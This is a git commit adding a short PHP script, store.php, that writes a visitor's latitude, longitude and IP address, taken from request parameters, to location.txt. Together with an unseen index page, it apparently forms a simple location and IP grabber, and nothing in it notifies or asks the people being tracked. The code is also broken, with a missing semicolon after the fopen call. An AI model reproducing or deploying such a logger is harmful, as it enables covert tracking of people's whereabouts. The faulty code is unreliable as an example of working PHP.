236eb28554c051ac46e43a03f999c2d8f5af21f1
Developer Tijan <108567329+developertijanke@users.noreply.github.com>
2023-11-18 09:28:45 -0800

    uploaded index.htlm and store.php
    Developer Tijan simple html and php

---
+++ store.php
@@ -0,0 +1,7 @@
+<?php
+$myfile = fopen("location.txt", "w")
+$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"]. "\nIP: " . $_SERVER["REMOTE_ADDR"];
+fwrite($myfile, $txt);
+fclose($myfile);
+
+?>
